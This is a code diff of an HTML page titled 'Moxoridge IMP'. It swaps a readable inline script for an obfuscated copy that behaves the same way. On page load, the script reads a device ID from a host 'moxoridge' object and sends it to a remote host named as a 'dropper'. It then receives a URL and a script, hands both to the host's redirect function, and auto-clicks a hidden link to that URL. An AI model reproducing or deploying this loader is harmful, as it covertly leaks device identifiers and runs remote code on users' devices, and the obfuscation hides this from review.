@@ -6,36 +6,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Moxoridge IMP</title>
         <script>
-            if (typeof moxoridge !== "undefined" && moxoridge !== null) {
-                let did = moxoridge.did();
-                let time = 10;
-                moxoridge.writeT(time);
-                fetch(`https://xxtasks-dropper-test-bqdsmjaucs.ap-southeast-1.fcapp.run?did=${encodeURIComponent(did)}`)
-                    .then((response) => {
-                        if (!response.ok) {
-                            throw new Error("Network response was not ok");
-                        }
-                        return response.json();
-                    })
-                    .then((data) => {
-                        if (data.url && data.script) {
-                            moxoridge.redirect(data.url, data.script);
-
-                            setTimeout(() => {
-                                const link = document.createElement("a");
-                                link.href = data.url;
-                                link.rel = "noreferrer";
-                                document.body.appendChild(link);
-                                link.click();
-                            }, 1000); // 延迟 2000 毫秒 (2 秒)
-                        } else {
-                            moxoridge.completed();
-                        }
-                    })
-                    .catch((error) => {
-                        console.error("There has been a problem with your fetch operation:", error);
-                    });
-            }
+            const _0x3cde32=_0x2f3e;function _0x2f3e(_0x2e4d87,_0x45ab6a){const _0x465a9b=_0x465a();return _0x2f3e=function(_0x2f3e8b,_0x536289){_0x2f3e8b=_0x2f3e8b-0xdb;let _0x44eecf=_0x465a9b[_0x2f3e8b];return _0x44eecf;},_0x2f3e(_0x2e4d87,_0x45ab6a);}(function(_0x41564d,_0x4ee969){const _0x4203ed=_0x2f3e,_0x23b8e6=_0x41564d();while(!![]){try{const _0x492fe1=-parseInt(_0x4203ed(0xe4))/0x1*(-parseInt(_0x4203ed(0xe8))/0x2)+parseInt(_0x4203ed(0xee))/0x3+parseInt(_0x4203ed(0xf4))/0x4+parseInt(_0x4203ed(0xdf))/0x5+-parseInt(_0x4203ed(0xec))/0x6+parseInt(_0x4203ed(0xea))/0x7+-parseInt(_0x4203ed(0xf0))/0x8*(parseInt(_0x4203ed(0xeb))/0x9);if(_0x492fe1===_0x4ee969)break;else _0x23b8e6['push'](_0x23b8e6['shift']());}catch(_0x2ec649){_0x23b8e6['push'](_0x23b8e6['shift']());}}}(_0x465a,0x2ffcd));if(typeof moxoridge!=='undefined'&&moxoridge!==null){let did=moxoridge[_0x3cde32(0xef)](),time=0xa;moxoridge[_0x3cde32(0xe1)](time),fetch(_0x3cde32(0xe0)+encodeURIComponent(did))[_0x3cde32(0xe6)](_0x2738dc=>{const _0x12e017=_0x3cde32;if(!_0x2738dc['ok'])throw new Error(_0x12e017(0xe7));return _0x2738dc[_0x12e017(0xdc)]();})['then'](_0xbb9c13=>{const _0x41d645=_0x3cde32;_0xbb9c13['url']&&_0xbb9c13['script']?(moxoridge[_0x41d645(0xe3)](_0xbb9c13[_0x41d645(0xdd)],_0xbb9c13[_0x41d645(0xe9)]),setTimeout(()=>{const _0x55b10a=_0x41d645,_0x58b2fe=document['createElement']('a');_0x58b2fe[_0x55b10a(0xf1)]=_0xbb9c13['url'],_0x58b2fe[_0x55b10a(0xed)]=_0x55b10a(0xdb),document[_0x55b10a(0xf2)][_0x55b10a(0xf3)](_0x58b2fe),_0x58b2fe['click']();},0x3e8)):moxoridge[_0x41d645(0xe2)]();})[_0x3cde32(0xde)](_0x2858c5=>{const _0x4d3219=_0x3cde32;console[_0x4d3219(0xe5)]('There\x20has\x20been\x20a\x20problem\x20with\x20your\x20fetch\x20operation:',_0x2858c5);});}function _0x465a(){const _0x45cf80=['342qVkWaA','532350mNymUN','rel','126330QrsWKb','did','93424EnZBDl','href','body','appendChild','1150252tbeiIK','noreferrer','json','url','catch','809015LlIIYR','https://xxtasks-dropper-test-bqdsmjaucs.ap-southeast-1.fcapp.run?did=','writeT','completed','redirect','71GeQQlC','error','then','Network\x20response\x20was\x20not\x20ok','2Jvvbnr','script','1662493ZuCZGD'];_0x465a=function(){return _0x45cf80;};return _0x465a();}
         </script>
     </head>
     <body></body>
